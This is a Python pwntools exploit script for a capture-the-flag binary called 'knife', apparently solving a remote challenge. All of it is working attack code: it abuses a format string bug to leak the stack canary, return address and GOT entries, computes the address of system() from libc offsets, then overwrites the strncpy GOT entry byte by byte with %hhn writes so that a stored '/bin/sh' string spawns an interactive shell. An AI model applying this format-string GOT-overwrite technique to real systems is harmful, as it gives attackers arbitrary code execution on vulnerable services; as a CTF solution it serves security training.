#!/usr/bin/env python3
from pwn import *

def pad(d, s):
    if len(d) % s == 0:
        return d, False
    return d + b'A' * (8 - len(d) % s), True

context.terminal = ('kgx', '-e')
elf = context.binary = ELF('./knife')
libcret = 0x29d90

if args.REMOTE:
    r = remote("knife.challs.olicyber.it", 11006)
elif args.GDB:
    r = gdb.debug("./knife", """
        b *main+68
        c
    """)
else:
    r = process(elf.path)

p = b'LOAD .%21$p.%23$p'
print(len(p))
r.sendline(p)
data = r.recvline().decode()[:-1].split('.')
canary = int(data[1], 16)
retaddr = int(data[2], 16)

print(hex(canary), hex(retaddr))

# search on https://libc.rip/ for a libc match
for fun in elf.got:
    p = b'LOAD .%18$s.'.ljust(16, b'A') + p64(elf.got[fun])
    r.sendline(p)
    data = r.recv(0x14).split(b'.')
    addr = u64(data[1].ljust(8, b'\0'))
    if fun == "signal":
        signaladdr = addr
    print(f'{fun} => {hex(addr)}', flush=True)

system = signaladdr - 0x42420 + 0x50d60 # signal - offsignal + offsys
print(hex(system))

r.sendline(b'STORE 1 /bin/sh')
r.recvlines(2)

# num1 = system % 0x10000
# num2 = (system >> 16) % 100 - 7
# num1 -= num2

# r.sendline(
#     (c := pad((f'LOAD 1 %{num2}c%20$hhn%{num1}c%21$hn').encode(), 8)) +
#     p64(elf.got['printf']+2) +
#     p64(elf.got['printf'])
# )
# print(c, len(c))

addr = elf.got['strncpy']
for i in range(6):
    fmt = system & 0xff
    print(hex(fmt))
    system >>= 8
    if fmt > 0:
        payload, res = pad((f'LOAD %{fmt - 5}c%18$hhn').encode(), 8)
        payload += p64(addr)
        assert len(payload) <= 32
        if res:
            payload = payload.replace(b'18', b'19')
            r.send(payload[:-1])
        else:
            r.sendline(payload)
        r.recvuntil(b'@@')
    addr += 1

r.sendline(b'STORE 1 roba')
r.interactive()
